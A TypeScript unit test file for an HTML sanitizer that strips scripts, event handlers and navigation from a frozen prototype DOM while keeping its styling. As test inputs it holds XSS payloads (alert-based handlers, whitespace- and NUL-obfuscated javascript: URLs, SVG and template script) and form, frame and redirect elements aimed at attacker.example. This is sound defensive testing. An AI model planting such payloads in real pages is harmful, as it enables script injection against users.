/**
 * Unit tests for sanitizeFrozenDom — the parent-side pass over a frozen
 * prototype DOM before it is re-hosted in the comment frame (design-mode.md
 * "Comment mode — live-DOM freeze + sanitizer + nonce-CSP").
 *
 * Two halves, both load-bearing: everything ACTIVE must be gone (defense in
 * depth behind the nonce CSP + navigation guard), and everything VISUAL must
 * survive verbatim — the user is commenting on what they saw, so a sanitizer
 * that quietly drops styling has broken the feature just as surely as one that
 * leaks a handler.
 */
import { describe, it, expect } from 'vitest';
import { sanitizeFrozenDom } from '../sanitizeFrozenDom';

/** Re-parse the output so assertions read the DOM, not the serialization. */
function parse(html: string): Document {
  return new DOMParser().parseFromString(sanitizeFrozenDom(html), 'text/html');
}

describe('sanitizeFrozenDom — active content is removed', () => {
  it('strips every on* handler attribute, whatever its case', () => {
    const doc = parse(
      '<body><button onclick="alert(1)" ONMOUSEOVER="x()">go</button><img src="data:image/gif;base64,R0lGOD" onerror="alert(2)"></body>',
    );
    const button = doc.querySelector('button');
    expect(button?.getAttribute('onclick')).toBeNull();
    expect(button?.getAttribute('onmouseover')).toBeNull();
    expect(doc.querySelector('img')?.getAttribute('onerror')).toBeNull();
    // The elements themselves stay — layout must be unchanged.
    expect(button?.textContent).toBe('go');
  });

  it('neutralizes javascript:/vbscript: URLs in href/src/formaction (attribute removed)', () => {
    const doc = parse(
      '<body>' +
        '<a href="javascript:alert(1)">a</a>' +
        '<a href="JaVaScRiPt:alert(2)">b</a>' +
        '<img src="vbscript:msgbox(1)">' +
        '<button formaction="javascript:alert(3)">c</button>' +
        '</body>',
    );
    for (const anchor of doc.querySelectorAll('a')) {
      expect(anchor.getAttribute('href')).toBeNull();
    }
    expect(doc.querySelector('img')?.getAttribute('src')).toBeNull();
    expect(doc.querySelector('button')?.getAttribute('formaction')).toBeNull();
    expect(doc.body.textContent).toContain('a');
  });

  it('sees through whitespace obfuscation of the scheme (tab / newline / leading space)', () => {
    // Browsers strip ASCII tab and newline from a URL ANYWHERE, so all three of
    // these navigate to javascript: despite not matching a literal prefix test.
    const doc = parse(
      '<body>' +
        '<a id="tab" href="java\tscript:alert(1)">x</a>' +
        '<a id="nl" href="jav\nascript:alert(2)">y</a>' +
        '<a id="lead" href="  \n JaVaScRiPt:alert(3)">z</a>' +
        '</body>',
    );
    for (const id of ['tab', 'nl', 'lead']) {
      expect(doc.getElementById(id)?.getAttribute('href')).toBeNull();
    }
  });

  it('is not fooled by a NUL-obfuscated scheme (the parser already neutered it)', () => {
    // The HTML parser rewrites U+0000 in an attribute value to U+FFFD, so the
    // value reaching the sanitizer is 'java\uFFFDscript:' — a relative URL no
    // browser executes. Asserted explicitly so a future 'harden the scheme check'
    // change does not read this surviving href as a leak.
    const doc = parse('<body><a id="nul" href="java\u0000script:alert(1)">z</a></body>');
    const href = doc.getElementById('nul')?.getAttribute('href') ?? '';
    expect(href).not.toContain('javascript:');
    expect(href).toContain('\uFFFD');
  });

  it('keeps ordinary and data: URLs (a benign href with a space is not a false positive)', () => {
    const doc = parse(
      '<body>' +
        '<a id="rel" href="/docs/page.html">rel</a>' +
        '<a id="ext" href="https://example.com/x">ext</a>' +
        '<a id="space" href="my page.html">space</a>' +
        '<img id="pic" src="data:image/png;base64,iVBORw0KGgo=" alt="pic">' +
        '</body>',
    );
    expect(doc.getElementById('rel')?.getAttribute('href')).toBe('/docs/page.html');
    expect(doc.getElementById('ext')?.getAttribute('href')).toBe('https://example.com/x');
    expect(doc.getElementById('space')?.getAttribute('href')).toBe('my page.html');
    expect(doc.getElementById('pic')?.getAttribute('src')).toBe('data:image/png;base64,iVBORw0KGgo=');
  });

  it('removes script/object/embed/iframe/frameset/base/link and meta http-equiv outright', () => {
    const doc = parse(
      '<head>' +
        '<meta charset="utf-8">' +
        '<meta http-equiv="refresh" content="0;url=https://attacker.example">' +
        '<base href="https://attacker.example/">' +
        '<link rel="stylesheet" href="https://attacker.example/x.css">' +
        '</head>' +
        '<body>' +
        '<script>alert(1)</script>' +
        '<object data="x.swf"></object>' +
        '<embed src="x.swf">' +
        '<iframe src="https://attacker.example"></iframe>' +
        '<p>kept</p>' +
        '</body>',
    );
    for (const selector of ['script', 'object', 'embed', 'iframe', 'base', 'link', 'meta[http-equiv]']) {
      expect(doc.querySelector(selector)).toBeNull();
    }
    // A plain, inert <meta> is not navigation-capable and stays.
    expect(doc.querySelector('meta[charset]')).not.toBeNull();
    expect(doc.querySelector('p')?.textContent).toBe('kept');
  });

  it('removes <frameset>/<frame> and <portal>', () => {
    const out = sanitizeFrozenDom(
      '<body><portal src="https://attacker.example"></portal><frameset><frame src="https://attacker.example"></frameset></body>',
    );
    expect(out).not.toContain('<portal');
    expect(out).not.toContain('<frameset');
    expect(out).not.toContain('<frame ');
  });

  it('removes <template> whole — its content is a fragment the tree walk never visits', () => {
    // A <script> inside <template> lives in template.content (a separate
    // DocumentFragment), not the walked tree — dropping the element closes the
    // blind spot. Fidelity-neutral: template content never renders.
    const out = sanitizeFrozenDom(
      '<body><template><script>alert(1)</script><img src=x onerror=alert(1)></template><p>kept</p></body>',
    );
    expect(out).not.toContain('<template');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('onerror');
    expect(out).toContain('<p>kept</p>');
  });

  it('handles SVG subtrees with the same rules (SVG <script>, onload, xlink:href)', () => {
    const doc = parse(
      '<body><svg viewBox="0 0 10 10" onload="alert(1)">' +
        '<script>alert(2)</script>' +
        '<circle cx="5" cy="5" r="4" fill="red" onclick="alert(3)"/>' +
        '<a xlink:href="javascript:alert(4)"><text x="0" y="9">t</text></a>' +
        '</svg></body>',
    );
    const svg = doc.querySelector('svg');
    expect(svg).not.toBeNull();
    expect(svg?.getAttribute('onload')).toBeNull();
    expect(doc.querySelector('svg script')).toBeNull();
    const circle = doc.querySelector('circle');
    expect(circle?.getAttribute('onclick')).toBeNull();
    // Presentation survives.
    expect(circle?.getAttribute('fill')).toBe('red');
    expect(svg?.getAttribute('viewBox')).toBe('0 0 10 10');
    expect(doc.querySelector('svg a')?.getAttribute('xlink:href')).toBeNull();
    expect(doc.querySelector('svg text')?.textContent).toBe('t');
  });

  it('strips <form action> and formaction while KEEPING the elements', () => {
    const doc = parse(
      '<body><form action="https://attacker.example/collect" method="post" class="row">' +
        '<input name="q" value="v" formaction="https://attacker.example/i">' +
        '<button type="submit" formaction="https://attacker.example/b">send</button>' +
        '</form></body>',
    );
    const form = doc.querySelector('form');
    expect(form).not.toBeNull();
    expect(form?.getAttribute('action')).toBeNull();
    // Non-navigating form attributes are untouched (they carry appearance/semantics).
    expect(form?.getAttribute('class')).toBe('row');
    expect(doc.querySelector('input')?.getAttribute('formaction')).toBeNull();
    expect(doc.querySelector('input')?.getAttribute('value')).toBe('v');
    expect(doc.querySelector('button')?.getAttribute('formaction')).toBeNull();
    expect(doc.querySelector('button')?.textContent).toBe('send');
  });
});

describe('sanitizeFrozenDom — visual fidelity is preserved', () => {
  it('keeps inline <style>, style attributes, classes, and data-design-id anchors', () => {
    const doc = parse(
      '<head><style>.card { color: rgb(1, 2, 3); position: absolute; }</style></head>' +
        '<body><div class="card" style="position: fixed; top: 4px" data-design-id="card-1">' +
        '<span aria-label="Close">×</span></div></body>',
    );
    // The whole stylesheet survives verbatim — a frozen capture is judged on how
    // it LOOKS, so no per-property filtering.
    expect(doc.querySelector('style')?.textContent).toBe('.card { color: rgb(1, 2, 3); position: absolute; }');
    const card = doc.querySelector('.card');
    expect(card?.getAttribute('style')).toBe('position: fixed; top: 4px');
    expect(card?.getAttribute('data-design-id')).toBe('card-1');
    expect(doc.querySelector('span')?.getAttribute('aria-label')).toBe('Close');
  });

  it('preserves runtime-built DOM verbatim (the point of freezing the LIVE DOM)', () => {
    // What a serializer returns for a prototype whose JS built its own markup:
    // plain elements with no trace of the script that made them.
    const runtimeBuilt =
      '<body><ul id="list"><li data-design-id="row-0">Alpha</li><li data-design-id="row-1">Beta</li></ul>' +
      '<div id="count">2 items</div></body>';
    const doc = parse(runtimeBuilt);
    expect(doc.querySelectorAll('#list li')).toHaveLength(2);
    expect(doc.querySelector('#list li')?.getAttribute('data-design-id')).toBe('row-0');
    expect(doc.getElementById('count')?.textContent).toBe('2 items');
  });

  it('returns a full document string with a doctype and an <html> root', () => {
    const out = sanitizeFrozenDom('<body><p>x</p></body>');
    expect(out.startsWith('<!doctype html><html')).toBe(true);
    expect(out).toContain('<p>x</p>');
    expect(out).toContain('</html>');
  });

  it('degrades gracefully on empty / non-markup input rather than throwing', () => {
    expect(() => sanitizeFrozenDom('')).not.toThrow();
    expect(sanitizeFrozenDom('just text')).toContain('just text');
  });

  it('is idempotent — re-sanitizing its own output is a no-op', () => {
    const input =
      '<body><a href="javascript:alert(1)" onclick="x()">a</a><style>.k{color:red}</style><p>b</p></body>';
    const once = sanitizeFrozenDom(input);
    expect(sanitizeFrozenDom(once)).toBe(once);
  });
});
